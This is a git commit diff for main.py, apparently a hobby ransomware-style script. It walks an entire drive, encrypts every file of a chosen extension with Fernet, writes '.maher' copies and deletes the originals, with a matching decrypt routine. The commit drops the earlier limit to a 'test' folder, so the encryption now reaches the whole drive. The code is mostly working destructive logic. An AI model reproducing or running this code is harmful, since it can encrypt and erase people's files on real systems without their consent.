cdaad4c54f65f8bd5689ad35ec0664e750db29a4
Mohammad Mahdi Erfani <mohammadmahdierfani1@gmail.com>
2022-03-23 00:50:00 +0430

    some cha

--- main.py
+++ main.py
@@ -1,9 +1,13 @@
+
+# !!! Dangerous !!!
+
+# https://github.com/MMErfani/
 from subprocess import check_output
 from cryptography.fernet import Fernet
 import os
 
-def enc(key="^1",drive="D"):
-    if key == "^1":  
+def enc(target_file_extention, encrypted_file_extention="maher", key=1, drive="D"):
+    if key == 1:  
         key = Fernet.generate_key()
 
     Encrypt = Fernet(key)
@@ -11,25 +15,26 @@ def enc(key="^1",drive="D"):
     new_file = open("key", "w")   #just for test
     new_file.write(str(key))      #just for test
 
-    cmd = check_output(f"{drive}: && cd test && dir /S /B *.txt", shell=True).decode().split() 
+    cmd = check_output(f"{drive}: dir /S /B *.{target_file_extention}", shell=True).decode().split() 
+    try:
+        for i in cmd:
+            try:
+                with open(i, "rb") as thisfile:
+                    data = thisfile.read()
+                    enc_data = Encrypt.encrypt(data)
+                    new_file = open(i+f".{encrypted_file_extention}", "wb")
+                    new_file.write(enc_data)
+                    thisfile.close()
+                    new_file.close()
+                    os.remove(i)
+                    print(i + "------------> " + "Encrypted")
+            except:
+                pass
+    except:
+        pass
 
-    for i in cmd:
-        try:
-            with open(i, "rb") as thisfile:
-                data = thisfile.read()
-                enc_data = Encrypt.encrypt(data)
-                new_file = open(i+".maher", "wb")
-                new_file.write(enc_data)
-                thisfile.close()
-                new_file.close()
-                os.remove(i)
-                print(i + "------------> " + "Encrypted")
-        except:
-            pass
-
-
-def dec(key="^1",drive="D"):
-    if key == "^1":
+def dec(encrypted_file_extention="maher", key=1, drive="D"):
+    if key == 1:
         keyfile = open("key", "r")
         key = keyfile.read()
         key = b"%s" % bytes(key.split("'")[1].encode())
@@ -39,22 +44,23 @@ def dec(key="^1",drive="D"):
     
     Decrypt = Fernet(key)
 
-    cmd = check_output(f"{drive}: && cd test && dir /S /B *.maher", shell=True).decode().split()
+    cmd = check_output(f"{drive}: && dir /S /B *.{encrypted_file_extention}", shell=True).decode().split()
 
-    for i in cmd:
-            try:
-                with open(i, "rb") as thisfile:
-                    data = thisfile.read()
-                    dec_data = Decrypt.decrypt(data)
-                    new_file = open(i.replace(".maher", ""), "wb")
-                    new_file.write(dec_data)
-                    thisfile.close()
-                    new_file.close()
-                    os.remove(i)
-                    print(i + "------------> " + "Decrypted")
-            except:
-                pass
+    try:
+        for i in cmd:
+                try:
+                    with open(i, "rb") as thisfile:
+                        data = thisfile.read()
+                        dec_data = Decrypt.decrypt(data)
+                        new_file = open(i.replace(f".{encrypted_file_extention}", ""), "wb")
+                        new_file.write(dec_data)
+                        thisfile.close()
+                        new_file.close()
+                        os.remove(i)
+                        print(i + "------------> " + "Decrypted")
+                except:
+                    pass
+    except:
+        pass
 
 
-#enc(drive="f")
-dec(drive="f")
